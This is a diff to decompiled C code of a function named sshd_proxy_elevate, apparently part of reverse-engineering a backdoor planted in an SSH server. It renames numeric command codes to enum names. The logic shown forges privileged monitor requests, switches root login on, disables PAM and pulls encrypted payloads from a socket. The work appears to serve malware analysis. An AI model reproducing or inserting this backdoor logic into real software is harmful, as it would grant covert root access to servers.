@@ -21,7 +21,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
 {
   u8 current_byte;
   char expected_digest_byte;
-  uint cmd_type;
+  monitor_cmd_type_t cmd_type;
   imported_funcs_t *imports;
   libc_imports_t *libc_funcs;
   sshd_ctx_t *sshd_ctx;
@@ -44,7 +44,6 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   byte extraout_DL;
   size_t payload_size;
   byte monitor_flag_mask;
-  uint socket_index;
   u64 *stack_slot;
   u64 payload_room;
   uint *puVar23;
@@ -116,7 +115,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
     return FALSE;
   }
   cmd_type = args->cmd_type;
-  if ((cmd_type == 3) && ((args->args->monitor_flags & 0x40) == 0)) {
+  if ((cmd_type == MONITOR_CMD_PROXY_EXCHANGE) && ((args->args->monitor_flags & 0x40) == 0)) {
     if (args->rsa == (RSA *)0x0) {
       return FALSE;
     }
@@ -147,16 +146,16 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   sshd_ctx = ctx->sshd_ctx;
   // AutoDoc: Before the mm hooks land, only the minimal control-plane commands are accepted; anything needing KEYALLOWED is rejected.
   if (sshd_ctx->have_mm_answer_keyallowed == FALSE) {
-    if (cmd_type == 0) {
+    if (cmd_type == MONITOR_CMD_CONTROL_PLANE) {
       return FALSE;
     }
     cmd_args = args->args;
-    if (cmd_type != 3) {
+    if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) {
       if (cmd_args == (cmd_arguments_t *)0x0) {
-        if (cmd_type != 1) goto LAB_0010845f;
+        if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) goto LAB_0010845f;
       }
-      else if (cmd_type != 1) {
-        if (cmd_type == 2) goto LAB_0010845f;
+      else if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
+        if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) goto LAB_0010845f;
         goto LAB_00108447;
       }
       goto LAB_0010843f;
@@ -172,16 +171,16 @@ LAB_00108450:
   else {
     cmd_args = args->args;
     if (cmd_args == (cmd_arguments_t *)0x0) {
-      if (cmd_type == 0) goto LAB_00108434;
-      if (cmd_type != 1) {
+      if (cmd_type == MONITOR_CMD_CONTROL_PLANE) goto LAB_00108434;
+      if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
 LAB_00108447:
-        if (cmd_type != 3) goto LAB_0010845f;
+        if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010845f;
         goto LAB_0010844c;
       }
     }
-    else if (cmd_type != 1) {
-      if (cmd_type == 2) goto LAB_0010845f;
-      if (cmd_type != 0) goto LAB_00108447;
+    else if (cmd_type != MONITOR_CMD_PATCH_VARIABLES) {
+      if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) goto LAB_0010845f;
+      if (cmd_type != MONITOR_CMD_CONTROL_PLANE) goto LAB_00108447;
 LAB_00108434:
       current_byte = cmd_args->monitor_flags;
       goto LAB_00108450;
@@ -191,15 +190,16 @@ LAB_0010843f:
   }
   *sshd_ctx->permit_root_login_ptr = 3;
 LAB_0010845f:
-  if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
+  if ((args->cmd_type < MONITOR_CMD_SYSTEM_EXEC) || (args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE))
+  {
     if ((cmd_args->control_flags & 0x40) != 0) {
       if (sshd_ctx->use_pam_ptr == (int *)0x0) {
         return FALSE;
       }
       *sshd_ctx->use_pam_ptr = 0;
     }
-    // AutoDoc: PRIV/EXIT payloads hunt the stack for the staged ChaCha blob, verify its hash, and decrypt it in place before forging the monitor request.
-    if ((args->cmd_type == 3) && (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
+    if ((args->cmd_type == MONITOR_CMD_PROXY_EXCHANGE) &&
+       (monitor_flag_mask = cmd_args->monitor_flags & 0xc0, monitor_flag_mask != 0xc0)) {
       if (monitor_flag_mask == 0x40) {
         if (libc_funcs->exit == (pfn_exit_t)0x0) {
           return FALSE;
@@ -460,7 +460,7 @@ LAB_0010845f:
               (*imports->RSA_free)(rsa_ctx);
 LAB_00108861:
               cmd_args = args->args;
-              uVar11 = args->cmd_type;
+              cmd_type = args->cmd_type;
               if (cmd_args == (cmd_arguments_t *)0x0) {
                 return FALSE;
               }
@@ -469,25 +469,25 @@ LAB_00108861:
                 success = sshd_get_client_socket(ctx,&monitor_fd,1,DIR_WRITE);
               }
               else {
-                if (uVar11 == 2) {
+                if (cmd_type == MONITOR_CMD_SYSTEM_EXEC) {
                   monitor_flag_mask = cmd_args->monitor_flags >> 1;
 LAB_001088b7:
-                  socket_index = (uint)monitor_flag_mask;
+                  uVar11 = (uint)monitor_flag_mask;
                 }
-                else if (uVar11 < 3) {
-                  if (uVar11 != 0) {
+                else if (cmd_type < MONITOR_CMD_PROXY_EXCHANGE) {
+                  if (cmd_type != MONITOR_CMD_CONTROL_PLANE) {
                     monitor_flag_mask = cmd_args->monitor_flags >> 2;
                     goto LAB_001088b7;
                   }
-                  socket_index = cmd_args->monitor_flags >> 3 & 0xf;
+                  uVar11 = cmd_args->monitor_flags >> 3 & 0xf;
                 }
                 else {
-                  socket_index = 1;
-                  if (uVar11 == 3) {
-                    socket_index = cmd_args->request_flags & 0x1f;
+                  uVar11 = 1;
+                  if (cmd_type == MONITOR_CMD_PROXY_EXCHANGE) {
+                    uVar11 = cmd_args->request_flags & 0x1f;
                   }
                 }
-                success = sshd_get_usable_socket(&monitor_fd,socket_index,ctx->libc_imports);
+                success = sshd_get_usable_socket(&monitor_fd,uVar11,ctx->libc_imports);
               }
               status = monitor_fd;
               if (success == FALSE) {
@@ -513,8 +513,9 @@ LAB_001088b7:
               if (libc_funcs->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
-              // AutoDoc: COMMAND payloads (and explicit KEYALLOWED continuations) borrow an sshbuf so extra ciphertext can follow the forged frame.
-              if ((cmd_type == 0) || ((cmd_type == 3 && ((cmd_args->request_flags & 0x20) != 0)))) {
+              if ((cmd_type == MONITOR_CMD_CONTROL_PLANE) ||
+                 ((cmd_type == MONITOR_CMD_PROXY_EXCHANGE && ((cmd_args->request_flags & 0x20) != 0))))
+              {
                 success = sshd_get_sshbuf(sshbuf_vec,ctx);
                 if (success == FALSE) {
                   return FALSE;
@@ -526,7 +527,7 @@ LAB_001088b7:
               if (io_result < 0) {
                 return FALSE;
               }
-              if (cmd_type == 0) {
+              if (cmd_type == MONITOR_CMD_CONTROL_PLANE) {
 LAB_001089b5:
                 netlen_tmp[1] = netlen_tmp[1] & 0xffffff00;
                 payload_size = sshbuf_vec[0].size;
@@ -544,10 +545,10 @@ LAB_001089b5:
                 if (io_result < 0) {
                   return FALSE;
                 }
-                if (cmd_type != 3) goto LAB_0010897e;
+                if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010897e;
               }
               else {
-                if (cmd_type != 3) goto LAB_0010897e;
+                if (cmd_type != MONITOR_CMD_PROXY_EXCHANGE) goto LAB_0010897e;
                 if ((cmd_args->request_flags & 0x20) != 0) goto LAB_001089b5;
               }
               if (-1 < (char)cmd_args->control_flags) {
@@ -590,7 +591,7 @@ LAB_0010897e:
                   payload_remaining = payload_remaining - io_result;
                 } while (payload_remaining != 0);
               }
-              if (cmd_type != 2) {
+              if (cmd_type != MONITOR_CMD_SYSTEM_EXEC) {
                 return TRUE;
               }
               if (libc_funcs->exit == (pfn_exit_t)0x0) {
